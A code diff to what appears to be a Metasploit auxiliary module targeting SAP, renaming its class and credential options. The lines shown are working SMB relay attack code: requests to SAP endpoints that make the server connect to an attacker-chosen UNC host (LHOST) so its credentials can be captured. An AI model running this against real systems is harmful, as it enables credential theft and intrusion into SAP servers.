@@ -22,7 +22,7 @@
 
 require 'msf/core'
 
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -53,8 +53,8 @@ class Metasploit4 < Msf::Auxiliary
     register_options([
       Opt::RPORT(8000),
       OptString.new('CLIENT',   [true,  'SAP client', '001']),
-      OptString.new('USERNAME', [false, 'Username (Ex SAP*)']),
-      OptString.new('PASSWORD', [false, 'Password (Ex 06071992)']),
+      OptString.new('HttpUsername', [false, 'Username (Ex SAP*)']),
+      OptString.new('HttpPassword', [false, 'Password (Ex 06071992)']),
       OptAddress.new('LHOST',   [true,  'Server IP or hostname of the SMB Capture system']),
       OptEnum.new('ABUSE',      [true,  'SMB Relay abuse to use', "MMR",
         [
@@ -69,11 +69,11 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def valid_credentials?
-    if datastore['USERNAME'].nil? or datastore['USERNAME'].empty?
+    if datastore['HttpUsername'].blank?
       return false
     end
 
-    if datastore['PASSWORD'].nil? or datastore['PASSWORD'].empty?
+    if datastore['HttpPassword'].blank?
       return false
     end
     return true
@@ -98,7 +98,7 @@ class Metasploit4 < Msf::Auxiliary
       res = send_request_raw({
         'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
         'method' => 'POST',
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
         'data' => data,
         'ctype' => 'text/xml; charset=UTF-8',
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT']
@@ -118,7 +118,7 @@ class Metasploit4 < Msf::Auxiliary
     begin
       smb_uri = "\\\\#{datastore['LHOST']}\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}"
 
-      if datastore['USERNAME'].empty?
+      if datastore['HttpUsername'].empty?
         vprint_status("#{rhost}:#{rport} - Sending unauthenticated request for #{smb_uri}")
         res = send_request_cgi({
           'uri' => '/mmr/MMR',
@@ -137,7 +137,7 @@ class Metasploit4 < Msf::Auxiliary
         res = send_request_cgi({
           'uri' => '/mmr/MMR',
           'method' => 'GET',
-          'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+          'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
           'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
           'ctype' => 'text/xml; charset=UTF-8',
           'vars_get' => {
@@ -169,7 +169,7 @@ class Metasploit4 < Msf::Auxiliary
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
